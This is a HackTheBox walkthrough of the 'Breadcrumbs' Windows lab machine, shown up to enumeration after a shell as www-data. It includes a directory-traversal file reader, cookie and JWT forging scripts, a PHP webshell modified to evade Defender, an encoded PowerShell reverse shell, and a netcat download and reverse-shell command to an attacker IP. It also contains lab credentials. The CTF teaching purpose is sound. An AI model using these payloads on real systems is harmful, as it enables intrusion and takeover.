---
title: HTB: Breadcrumbs
url: https://0xdf.gitlab.io/2021/07/17/htb-breadcrumbs.html
date: 2021-07-17T13:45:00+00:00
difficulty: Hard [40]
os: Windows
tags: ctf, htb-breadcrumbs, hackthebox, nmap, gobuster, burp, python, cookies, jwt, upload, webshell, defender, password-reuse, tunnel, stickynotes, sqlite, ghidra, chisel, sqli, injection, cyberchef, aes, crypto, htb-buff, oscp-plus-v2
---

![Breadcrumbs](https://0xdfimages.gitlab.io/img/breadcrumbs-cover.png)

Breadcrumbs starts with a fair amount of web enumeration and working to get little bits of additional access. First I’ll leak the page source with a directory traversal vulnerability, and use that to get the algorithms necessary to forge both a session cookie and a JWT token. With both of those cookies, I gain administrator access to the site, and can upload a webshell after bypassing some filtering and Windows Defender. I’ll find the next user’s data in the website files. I’ll find another password in Sticky Notes data, and use that to get access to a new password manager under development. To get to administrator, I’ll exploit a SQL injection in the password manager to get the encrypted password and the key material to decrypt it, providing the admin password.

## Box Info

| Name | [Breadcrumbs](https://hackthebox.com/machines/breadcrumbs)  [Breadcrumbs](https://hackthebox.com/machines/breadcrumbs) [Play on HackTheBox](https://hackthebox.com/machines/breadcrumbs) |
| --- | --- |
| Release Date | [20 Feb 2021](https://twitter.com/hackthebox_eu/status/1362425103347253248) |
| Retire Date | 17 Jul 2021 |
| OS | Windows Windows |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Breadcrumbs |
| Radar Graph | Radar chart for Breadcrumbs |
| First Blood User | 00:56:49[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| First Blood Root | 01:01:42[xct xct](https://app.hackthebox.com/users/13569) |
| Creator | [helich0pper helich0pper](https://app.hackthebox.com/users/163104) |

## Recon

### nmap

`nmap` found many open TCP ports:

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.228
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-20 14:04 EST
Nmap scan report for 10.10.10.228
Host is up (0.013s latency).
Not shown: 65520 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
5040/tcp  open  unknown
7680/tcp  open  pando-pub
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 7.62 seconds

oxdf@parrot$ nmap -p 22,80,135,139,443,445,3306,5040,7680,49664-49669 -sC -sV -oA scans/nmap-tcp
scripts 10.10.10.228
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-20 14:06 EST
Nmap scan report for 10.10.10.228
Host is up (0.013s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA)
|   256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)
|_  256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)
80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   NULL, WMSRequest: 
|_    Host '10.10.14.13' is not allowed to connect to this MariaDB server
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=2/20%Time=60315D9B%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.13'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(WMSRequest,4
SF:A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.13'\x20is\x20not\x20allowed\x
SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2m32s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-20T19:11:17
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 172.89 seconds

```

Big take-aways from `nmap`:
- This clearly looks like a Windows box, based on the TCP 135/139/445 output, SSH banner, etc.
- Should I get creds, SSH (22) is available.
- MySQL (3306) is running but not accepting connections from my host.
- Two Apache servers (80 and 443)
- Two unknowns to keep in mind: 5040, 7680. Poking at each with `curl` and `nc` didn’t return anything.

### SMB - TCP 445

I’m not able to get a null session on SMB with either `smbmap` or `smbclient`:

```

oxdf@parrot$ smbmap -H 10.10.10.228
[!] Authentication error on 10.10.10.228
oxdf@parrot$ echo exit | smbclient -L \\\\10.10.10.228
Enter WORKGROUP\oxdf's password: 
session setup failed: NT_STATUS_ACCESS_DENIED

```

### Website - TCP 80 / 443

#### Site

As far as I could tell, the sites on 80 and 443 were the same, just HTTP vs HTTPS.

The site is for a library:

![image-20210202094715255](https://0xdfimages.gitlab.io/img/image-20210202094715255.png)

The menu has a link back to this page, `index.php`. The “Check books.” link leads to `/php/books.php`:

![image-20210202094756237](https://0xdfimages.gitlab.io/img/image-20210202094756237.png)

Searching in here returns books that have the input in the title (it looks like it appends wildcards on either side). Searching for `an` in the title returns:

![image-20210202095457991](https://0xdfimages.gitlab.io/img/image-20210202095457991.png)

Clicking the “Book” button loads an overlay with more details:

![image-20210202095520505](https://0xdfimages.gitlab.io/img/image-20210202095520505.png)

Each time the user does a search, the site sends the following HTTP request:

```

POST /includes/bookController.php HTTP/1.1
Host: 10.10.10.204:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.204:8080/php/books.php
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 24
Connection: close
Cookie: PHPSESSID=boodcfbe3l05lgaej1hs3fct9e

title=an&author=&method=0

```

And when details are requested:

```

POST /includes/bookController.php HTTP/1.1
Host: 10.10.10.204:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.204:8080/php/books.php
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 24
Connection: close
Cookie: PHPSESSID=boodcfbe3l05lgaej1hs3fct9e

book=book7.html&method=1

```

Any time a filename is listed as a parameter, it’s worth looking for file include and for directory traversal and/or file include vulns. Sending this request to Burp Repeater, if I change it to `book=.`, it returns an error:

```

<br />
<b>Warning</b>:  file_get_contents(../books/.): failed to open stream: Permission denied in <b>C:\xampp\htdocs\includes\bookController.php</b> on line <b>28</b><br />
false

```

This leaks lots of good info. The page is prepending `../books/` to what I submit, and the source for the page is running out of `C:\xampp\htdocs\includes\bookController.php`. It’s loading the content with `file_get_contents`, so it will just display the contents of the file, and not execute it as PHP, which means I can leak source, but not use this for code execution.

Updating the request to `book=..\includes\bookController.php`, I get the source for this page (some whitespace edited):

```

<?php
    
    if($_SERVER['REQUEST_METHOD'] == "POST"){
        $out = "";
        require '..\/db\/db.php';
        $title = "";
        $author = "";
        if($_POST['method'] == 0){
            if($_POST['title'] != ""){
                $title = "%".$_POST['title']."%";
            }
            if($_POST['author'] != ""){
                $author = "%".$_POST['author']."%";
            }
            
            $query = "SELECT * FROM books WHERE title LIKE ? OR author LIKE ?";
            $stmt = $con->prepare($query);
            $stmt->bind_param('ss', $title, $author);
            $stmt->execute();
            $res = $stmt->get_result();
            $out = mysqli_fetch_all($res,MYSQLI_ASSOC);
        } elseif($_POST['method'] == 1){
            $out = file_get_contents('..\/books\/'.$_POST['book']);
        } else {
            $out = false;
        }
        
        echo json_encode($out);
    }

```

I’ll dig into this more later, but it’s clear I can read files that I shouldn’t be able to read. It’s also clear these files are not being included (executed as PHP code).

#### Directory Brute Force

I’ll run `gobuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@parrot$ gobuster dir -u http://10.10.10.228 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x php -o scans/gobuster-80-small-php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.228
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/02/20 14:15:36 Starting gobuster
===============================================================
/index.php (Status: 200)
/books (Status: 301)
/php (Status: 301)
/portal (Status: 301)
/css (Status: 301)
/includes (Status: 301)
/db (Status: 301)
/js (Status: 301)
/licenses (Status: 403)
/%20 (Status: 403)
/*checkout* (Status: 403)
/*checkout*.php (Status: 403)
/phpmyadmin (Status: 403)
/webalizer (Status: 403)
/*docroot* (Status: 403)
/*docroot*.php (Status: 403)
/* (Status: 403)
/*.php (Status: 403)
/con (Status: 403)
/con.php (Status: 403)
/http%3a (Status: 403)
/http%3a.php (Status: 403)
/**http%3a (Status: 403)
/**http%3a.php (Status: 403)
/aux (Status: 403)
/aux.php (Status: 403)
/*http%3a (Status: 403)
/*http%3a.php (Status: 403)
/%c0 (Status: 403)
/%c0.php (Status: 403)
===============================================================
2021/02/20 14:20:25 Finished
===============================================================

```

`/portal` is interesting for sure. `/db` has directory listing on (though `db.php` returns an empty page):

![image-20210202132435195](https://0xdfimages.gitlab.io/img/image-20210202132435195.png)

#### /portal

This path redirects to `/portal/login.php`, which presents a login form:

![image-20210202132653801](https://0xdfimages.gitlab.io/img/image-20210202132653801.png)

The “helper” link leads to `/portal/php/admins.php`:

![image-20210202132731578](https://0xdfimages.gitlab.io/img/image-20210202132731578.png)

I couldn’t log in as any of these users (though I’ll keep a list for later). The Sign up link on the login page does work to provide some access:

![image-20210202132831037](https://0xdfimages.gitlab.io/img/image-20210202132831037.png)

“Check tasks” leads to `/portal/pip/issues.php`:

![image-20210202133123588](https://0xdfimages.gitlab.io/img/image-20210202133123588.png)

Clicking on the “Nuke it” bottoms just pops saying that I’m awaiting approval. There is a hint here that the book information is not stored in a database, which suggests perhaps file storage.

“Order pizza” pops up a message box:

![image-20210202135117502](https://0xdfimages.gitlab.io/img/image-20210202135117502.png)

“User management” (`/portal/php/users.php`) gives the same list of users, now with roles (and the user I created is on there):

![image-20210202135149699](https://0xdfimages.gitlab.io/img/image-20210202135149699.png)

“File management” just blinks and stays in the same place. Looking in Burp, it’s requesting `/portal/php/files.php`, but getting back a 302 redirect to `../index.php`. However, that 302 has a full page in it, and if I catch the response in Burp, and change `302 Found` to `200 OK`, the page loads:

![image-20210202140030092](https://0xdfimages.gitlab.io/img/image-20210202140030092.png)

Even still, if I try to submit something, it fails:

![image-20210202140749125](https://0xdfimages.gitlab.io/img/image-20210202140749125.png)

## Shell as www-data

### Pull Source Files

The `file_get_contents` vulnerability returns a poorly formatted string:

![image-20210220144837036](https://0xdfimages.gitlab.io/img/image-20210220144837036.png)

Because I need to pull lots of source, I write a quick Python script:

```

#!/usr/bin/env python3

import requests
import sys

if len(sys.argv) != 2:
    print(f"[-] Usage: {sys.argv[0]} [path]")
    sys.exit()

resp = requests.post('http://10.10.10.228/includes/bookController.php',
        data = {'book': f'../{sys.argv[1]}', 'method': '1'})

print(bytes(resp.text, "utf-8").decode('unicode_escape').strip('"'))

```

I can run that to get source for a page:

```

oxdf@parrot$ python3 get_file.py /index.php
<?php session_start();                                                                                   
?>
<html lang="en">
    <head>
        <title>Library<\/title>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
...[snip]...

```

### Enumerate Login

There’s a hint about PHPSESSID cookies never expiring. I’ll get the source for `/portal/login.php`:

```

<?php                      
require_once 'authController.php'; 
?>                                                                                                       
<html lang="en">        
    <head>         
        <title>Binary<\/title>
...[snip]...

```

It’s mostly a static page, but loads `authController.php`, which is where the logic to handle the login POST request lives:

```

<?php                                                                                                    
require 'db/db.php';                                                                                    
require "cookie.php";                               
require "vendor/autoload.php";           
use \Firebase\JWT\JWT;          
                                                    
$errors = array();                     
$username = "";                                     
$userdata = array();                                                                                     
$valid = false;            
$IP = $_SERVER['REMOTE_ADDR'];
...[snip]...

```

The source looks ok. The code handles checking the DB for username and password hash matches. There’s no SQL injections, as it’s using PHP prepared statements:

```

...[snip]...
//if user clicks on login
if($_SERVER['REQUEST_METHOD'] === "POST"){
    if($_POST['method'] == 0){
        $username = $_POST['username'];
        $password = $_POST['password'];

        $query = "SELECT username,position FROM users WHERE username=? LIMIT 1";
        $stmt = $con->prepare($query);
        $stmt->bind_param('s', $username);
        $stmt->execute();
        $result = $stmt->get_result();
        while ($row = $result->fetch_array(MYSQLI_ASSOC)){
            array_push($userdata, $row);
        }
        $userCount = $result->num_rows;                 
        $stmt->close();

        if($userCount > 0){                                  
            $password = sha1($password);
            $passwordQuery = "SELECT * FROM users WHERE password=? AND username=? LIMIT 1";
            $stmt = $con->prepare($passwordQuery);
            $stmt->bind_param('ss', $password, $username);
            $stmt->execute();                                      
            $result = $stmt->get_result();
            
            if($result->num_rows > 0){
                $valid = true;
            }
            $stmt->close();
        }
...[snip]...

```

If the first DB query returns users, and the second returns a user with the same username and password, `$valid` is set to `true` which leads to the script creating two cookies.

There’s two other interesting files it imports with `require`, `cookie.php` and `db/db.php`. `db.php` has creds, which I’ll note:

```

<?php

$host="localhost";
$port=3306;
$user="bread";
$password="jUli901";
$dbname="bread";

$con = new mysqli($host, $user, $password, $dbname, $port) or die ('Could not connect to the database server' . mysqli_connect_error());
?>

```

### Forge PHPSESSID

#### Identify Code

The code in `authController.php` calls the function `makesession` to create the `PHPSESSID` cookie value:

```

        if($valid){                  
            session_id(makesession($username));
            session_start();

```

`session_id` [sets the current session](https://www.php.net/manual/en/function.session-id.php) to the input. The `makesession` function isn’t defined in this source, but in `cookies.php`:

```

<?php
/**
 * @param string $username  Username requesting session cookie
 * 
 * @return string $session_cookie Returns the generated cookie
 * 
 * @devteam
 * Please DO NOT use default PHPSESSID; our security team says they are predictable.
 * CHANGE SECOND PART OF MD5 KEY EVERY WEEK
 * */
function makesession($username){
    $max = strlen($username) - 1;
    $seed = rand(0, $max);
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528.\/9890";
    $session_cookie = $username.md5($key);

    return $session_cookie;
}

```

The session cookie is calculated by pullone one character at random from the username and adding some static characters and taking a hash. This means the number of possible cookies for a given user is the length of their username.

#### Find Valid Cookies

The `PHPSESSID` cookie is directly related to the username, and from above, I know it doesn’t expire.

I can write a Python script that will check each possible cookie for each user by calculating each possible cookie for each user and checking it at the `/portal` site:

```

#!/usr/bin/env python3

import hashlib
import requests

users = "alex,paul,jack,olivia,john,emma,william,lucas,sirine,juliette,support".split(",")

for user in users:
    print(f"\r[*] Trying cookies for {user}" + 20*" ", end="", flush=True)
    for c in user:
        h = hashlib.md5(f"s4lTy_stR1nG_{c}(!528./9890".encode('utf-8')).hexdigest()
        cookie = f"{user}{h}"
        resp = requests.get('http://10.10.10.228/portal/index.php', cookies={"PHPSESSID": cookie})
        if user in resp.text.lower():
            print(f"\r[+] Found cookie for {user}: {cookie}")
print("\r" + 40*" ")

```

It finds three valid cookies:

```

oxdf@parrot$ python3 test_cookies.py 
[+] Found cookie for paul: paul47200b180ccd6835d25d034eeb6e6390
[+] Found cookie for olivia: oliviaaa0aa8b0e94759562a5854d69b9e6b79
[+] Found cookie for john: john5815c66675415230039fb4616cd0dce8

```

#### Access as Paul

As Paul is the admin according to the users page, so that’s a good target to start with. I’ll replace my cookie in Firefox dev tools with his and on refresh, I’m logged in as Paul.

![image-20210202151528292](https://0xdfimages.gitlab.io/img/image-20210202151528292.png)

As Paul, clicking on “File management” takes me to `/portal/php/files.php` (no longer getting the redirect away from it), but I still get the message about “Insufficient privileges” on trying to upload.

### Forge JWT

The other cookie submitted with each request is named `token`, and it’s a JWT:

```

token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoiMHhkZiJ9fQ.5Z5Hxr_t6qXoDYrlPYODAbVLZSH0JZnMW-8pk9PrQIo

```

Dropping it into [JWT.io](https://jwt.io/), the only data is the username, and it’s my username:

![image-20210202152215166](https://0xdfimages.gitlab.io/img/image-20210202152215166.png)

The signature shows invalid because I’ve left the secret blank. This cookie is also generated in `authController.php`:

```

            $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
            $data = array();

            $payload = array(
                "data" => array(                            
                    "username" => $username
            ));

            $jwt = JWT::encode($payload, $secret_key, 'HS256');
             
            setcookie("token", $jwt, time() + (86400 * 30), "\/");

```

With access to the key, I can add that to the site and now it says signature verified:

![image-20210202152301921](https://0xdfimages.gitlab.io/img/image-20210202152301921.png)

That also means I can change it. I’ll change the username to paul, and copy the new JWT into Firefox.

Now when I upload a file, it just says “Success”.

### Upload WebShell

I’ll upload my standard mini PHP webshell:

```

<?php system($_REQUEST["cmd"]); ?>

```

It spits out warnings:

![image-20210202153323004](https://0xdfimages.gitlab.io/img/image-20210202153323004.png)

There’s two issues here:
1. The script is trying to move the file to `../uploads/shell.zip`, but I’ll need a `.php` extension if I want it to execute.
2. The file isn’t there to move. Uploading simple text files doesn’t give any error.

For the first issue, looking at the POST request, it becomes clear that this won’t be hard to fix:

```

POST /portal/includes/fileController.php HTTP/1.1
Host: 10.10.10.204:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.204:8080/portal/php/files.php
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------16341315556311626121038603130
Content-Length: 377
Connection: close
Cookie: PHPSESSID=paul47200b180ccd6835d25d034eeb6e6390; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU
Pragma: no-cache
Cache-Control: no-cache
-----------------------------16341315556311626121038603130
Content-Disposition: form-data; name="file"; filename="cmd.php"
Content-Type: application/x-php

<?php system($_REQUEST["cmd"]); ?>
-----------------------------16341315556311626121038603130
Content-Disposition: form-data; name="task"

shell.zip
-----------------------------16341315556311626121038603130--

```

The webpage is appending `.zip` to the given task name client side and sending that. I’ll send this request to repeater, and first change `shell.zip` to `shell.php`. The error message still comes, but now the second error shows it’s now trying to move to the right place:

```

move_uploaded_file(): Unable to move 'C:\xampp\tmp\phpA050.tmp' to '../uploads/shell.php' in <b>C:\xampp\htdocs\portal\includes\fileController.php

```

The second issue is something I’ve run into before in [Buff](/2020/11/21/htb-buff.html#fighting-with-defender). Windows Defender is flagging and deleting this file as malware, and then when PHP goes to move it, the file is no longer there. I’ll change the webshell to use `shell_exec` instead of `system`:

```

<?php $out=shell_exec($_REQUEST['cmd']); echo "<pre>$out</pre>"; ?>

```

Now I’ll upload the modified webshell to get around defender (and modify the filename to `.php` in Burp Proxy), and the site responds “Success. Have a great weekend!”.

Visiting `http://10.10.10.228/portal/uploads/shell.php?cmd=whoami` shows I have execution:

![image-20210202153838523](https://0xdfimages.gitlab.io/img/image-20210202153838523.png)

Because these cookies won’t change, I can automate this upload in a `curl` command:

```

oxdf@parrot$ curl http://10.10.10.228/portal/includes/fileController.php -H "Cookie: PHPSESSID=paul47200b180ccd6835d25d034eeb6e6390; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU" -F "file=@shell.php" -F "task=shell.php"
Success. Have a great weekend!oxdf@parrot$ 
oxdf@parrot$ curl http://10.10.10.228/portal/uploads/shell.php?cmd=whoami
breadcrumbs\www-data

```

### Shell

#### Nishang Fail

I’ll grab `Invoke-PowerShellTcpOneLine.ps1` from [Nishang](https://github.com/samratashok/nishang) and update it with my IP address, and then base64-encode it so that PowerShell can run it:

```

oxdf@parrot$ cp /opt/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 .
oxdf@parrot$ vim Invoke-PowerShellTcpOneLine.ps1 
oxdf@parrot$ cat Invoke-PowerShellTcpOneLine.ps1 | iconv -t utf-16le | base64 -w0
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANwAnACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKAA==

```

I tried passing this to the webshell, but no shell came back and nothing returned:

```

oxdf@parrot$ curl http://10.10.10.204:8080/portal/uploads/shell.php --data-urlencode "cmd=powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANwAnACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKAA=="

```

Given that I’ve already experienced Defender catching things on this host, it seems very likely that this Nishang shell is getting blocked as well.

#### nc.exe success

I’ll start a Python webserver hosting `nc64.exe`, and then get it using PowerShell `wget`:

```

oxdf@parrot$ curl http://10.10.10.228/portal/uploads/shell.php --data-urlencode "cmd=powershell -c wget 10.10.14.13/nc64.exe -outfile C:\programdata\nc64.exe"

```

Now connect back with a shell:

```

oxdf@parrot$ curl http://10.10.10.228/portal/uploads/shell.php --data-urlencode "cmd=C:\programdata\nc64.exe 10.10.14.13 443 -e powershell"

```

At my listening `nc` (with `rlwrap` to get up-arrow history and better terminal on Windows):

```

oxdf@parrot$ sudo rlwrap nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.228] 55270
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

C:\Users\www-data\Desktop\xampp\htdocs\portal\uploads>whoami
breadcrumbs\www-data

```

## Shell as juliette

### Enumeration

As the www-data user, I’ll check out the web files, and there’s a path I hadn’t found, `pizzaDeliveryUserData`:

```

PS C:\xampp\htdocs\portal> ls

    Directory: C:\xampp\htdocs\portal

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/16/2021  11:38 AM                assets
d-----         1/16/2021  11:38 AM                db
d-----         1/16/2021  11:38 AM                includes
d-----         1/16/2021  11:38 AM                php
d-----         1/16/2021  11:38 AM                pizzaDeliveryUserData
d-----          2/2/2021  12:58 PM                uploads
d-----         1/16/2021  11:38 AM                vendor
-a----          2/1/2021  10:40 PM           3956 authController.php
-a----          2/1/2021   9:40 PM            114 composer.json
-a----        11/28/2020  12:55 AM           6140 composer.lock
-a----         12/9/2020   3:30 PM            534 cookie.php
-a----          2/1/2021   6:59 AM           3757 index.php
-a----          2/1/2021   1:57 AM           2707 login.php
-a----         1/16/2021   1:47 PM            694 logout.php
-a----          2/1/2021   1:58 AM           2934 signup.php  

```

This sounds like it might be related to the “Order pizza” button that was disabled on the `/portal` page.

In the directory, each user has a file, though all but one are `.disabled`:

```

PS C:\xampp\htdocs\portal\pizzaDeliveryUserData> ls

    Directory: C:\xampp\htdocs\portal\pizzaDeliveryUserData

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
